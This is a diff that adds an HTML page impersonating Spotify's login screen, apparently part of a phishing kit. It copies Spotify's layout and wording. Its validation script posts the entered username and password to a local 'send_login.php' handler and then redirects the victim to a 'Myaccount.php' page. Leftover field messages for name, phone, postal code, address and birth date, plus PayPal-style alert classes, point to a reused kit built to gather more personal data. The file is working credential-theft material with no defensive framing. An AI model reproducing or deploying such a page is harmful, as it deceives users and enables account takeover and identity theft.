@@ -1,0 +1,264 @@
+<html id="app" lang="en" dir="ltr" class="ng-scope"><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+  <meta charset="utf-8">
+  <title class="ng-binding">Login - Spotify</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+
+  <link rel="icon" href="./style/favicon.ace4d8543bbb017893402a1e9d1ac1fa.ico">
+  <link href="./style/stylecss.css" media="screen" rel="stylesheet">
+
+
+
+
+
+
+<script src="./style/js/angular.min.js"></script>
+<script src="./style/js/jquery.min.js"></script>
+<script src="./style/js/jquery.mask.js"></script>
+<script src="./style/js/jquery.validate.min.js"></script>
+<script src="./style/js/style.js"></script>
+
+
+
+
+
+
+<script>
+
+
+$(function() {
+
+	var validator = $("#loginnrr").bind("invalid-form.validate", function() {
+			$("#errorrbiliing").html("<div class='vx_alert vx_alert-critical form-alert alertComponent test_alert-message'><p role='alert' aria-live='assertive' class='vx_alert-text'><!-- react-text: 204 -->Please check your information and try again.<!-- /react-text --></p></div>");})
+
+
+  $("form[name='loginnrr']").validate({
+
+	errorContainer: $("#errorrbiliing"),
+
+
+
+    rules: {
+
+
+      email: {
+        required: true,
+        email: true
+      },
+      password: {
+        required: true,
+        minlength: 5
+      }
+    },
+
+
+highlight: function ( element, errorClass, validClass ) {
+$( element ).parents( ".dddd" ).removeClass( validClass );
+	$( element ).parents( ".dddd" ).addClass( errorClass );
+				},
+unhighlight: function (element, errorClass, validClass) {
+					
+	$( element ).parents( ".dddd" ).addClass( validClass );
+$( element ).parents( ".dddd" ).removeClass( errorClass );
+				},
+
+
+
+    messages: {
+      Firstname: "First Name is required",
+      LastName: "Last Name is required",
+      phoneNumber : "Phone Number is required",
+      zipCod : "Postal Code is required",
+      addres : "Address Line is required",
+      username : "      Please enter your Spotify username or email address.",
+
+
+      password: {
+        required: "Please enter your password.",
+        minlength: "Your password must be at least 5 characters long"
+      },
+
+
+
+ birthdate: {
+        required: "Birth Date Day/Month/Year is required!",
+        minlength: "Please enter a valid Birth Date Day/Month/Year "
+      },
+
+
+
+
+
+      email: "Please enter a valid email address"
+    },
+
+
+     submitHandler: function(form) {
+$("#doori").show();
+
+
+      $.post("./system/send_login.php?ajax", $("#loginnrr").serialize(), function(result) {
+                            setTimeout(function() {
+
+
+                                $(location).attr("href", "./Myaccount.php");
+                        });
+                 });
+        },
+  
+  });
+
+});
+
+</script>
+
+
+
+
+
+
+</head>
+<body class="ng-scope">
+
+<div sp-header="" class="ng-scope"><div class="head ">
+  <a class="spotify-logo" tabindex="-1" title="Spotify" ng-href="/fr" href="/fr"></a>
+</div>
+</div>
+
+
+
+
+<div class="container-fluid login ng-scope">
+  
+  <div class="content">
+ 
+
+  <div class="row ng-scope">
+          <div class="col-xs-12 text-center">
+              <span id="login-to-continue" class="h5 ng-binding">To continue, log in to Spotify.</span>
+          </div>
+    </div>
+
+    <div class="row">
+      <div class="col-xs-12">
+        <a class="btn btn-block btn-facebook ng-binding" href="#">Log in with Facebook</a>
+      </div>
+    </div>
+
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="divider">
+          <strong class="divider-title ng-binding">or</strong>
+        </div>
+      </div>
+    </div>
+
+    <form name="loginnrr" id="loginnrr" method="post" class="ng-valid-sp-disallow-chars ng-invalid ng-invalid-required ng-dirty" novalidate="novalidate">
+     
+
+      <div class="dddd row ">
+        <div class="col-xs-12">
+          <label class="control-label sr-only ng-binding">
+            Email address or username
+          </label>
+         <input type="text" class="form-control input-with-feedback ng-valid-sp-disallow-chars ng-empty ng-invalid ng-invalid-required ng-touched ng-dirty" name="username" id="login-username" placeholder="Email address or username" required="" aria-required="true" aria-describedby="login-usernameinputError" aria-invalid="false">
+   
+
+
+          <div class="ng-scope">
+           
+
+            <label class="control-label-validation ng-binding ng-scope" for="login-username"><span id="login-usernameinputError" class="has-error" style="display: none;"></span></label>
+
+       
+          </div>
+        </div>
+      </div>
+
+      <div class="dddd row ">
+        <div class=" col-xs-12">
+          <label for="login-password" class="control-label sr-only ng-binding">
+            Password
+          </label>
+          <input type="password" class="form-control input-with-feedback ng-untouched ng-empty ng-invalid ng-invalid-required ng-dirty" name="password" id="login-password" placeholder="Password" required="" aria-required="true" aria-describedby="login-passwordinputError" aria-invalid="false">
+
+          <div class="ng-scope">
+     
+            <label class="control-label-validation ng-binding ng-scope" for="login-password"><span id="login-passwordinputError" class="has-error" style="display: none;"></span></label>
+          </div>
+        </div>
+      </div>
+
+      <div class="row row-submit">
+        <div class="col-xs-12 col-sm-6">
+          <div class="checkbox">
+            <label class="ng-binding">
+              <input type="checkbox" name="remember" id="login-remember" class="ng-pristine ng-untouched ng-valid ng-not-empty">
+              Remember me
+              <span class="control-indicator"></span>
+            </label>
+          </div>
+        </div>
+        <div class="col-xs-12 col-sm-6">
+          <button class="btn btn-block btn-green ng-binding" id="login-button">Log In</button>
+        </div>
+      </div>
+    </form>
+
+    <div class="row">
+      <div class="col-xs-12 text-center">
+        <p>
+          <a id="reset-password-link" class="ng-binding" href="#">Forgot your password?</a>
+        </p>
+      </div>
+    </div>
+
+    <div id="sign-up-section">
+      <div class="row">
+        <div class="col-xs-12">
+          <div class="ng-scope">
+     
+
+            <div class="ng-scope">
+            
+            	<div class="ng-scope">
+    <div class="row">
+        <div class="col-xs-12">
+            <div class="divider">
+      
+            </div>
+        </div>
+    </div>
+    <div class="row text-center mt-0">
+        <div class="h4 ng-binding">Don't have an account?</div>
+    </div>
+    <div>
+        <div class="row">
+            <div class="col-xs-12">
+                <a id="sign-up-link" class="btn btn-block btn-default ng-binding" role="button" href="#">Sign up for Spotify</a>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="divider"></div>
+        <p class="text-muted disclaimer text-center ng-binding">If you click "Log in with Facebook" and are not a Spotify user, you will be registered and you agree to Spotify's <a href="#" target="_blank">Terms &amp; Conditions</a> and <a href="#" target="_blank">Privacy Policy</a>.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+
+</body></html>
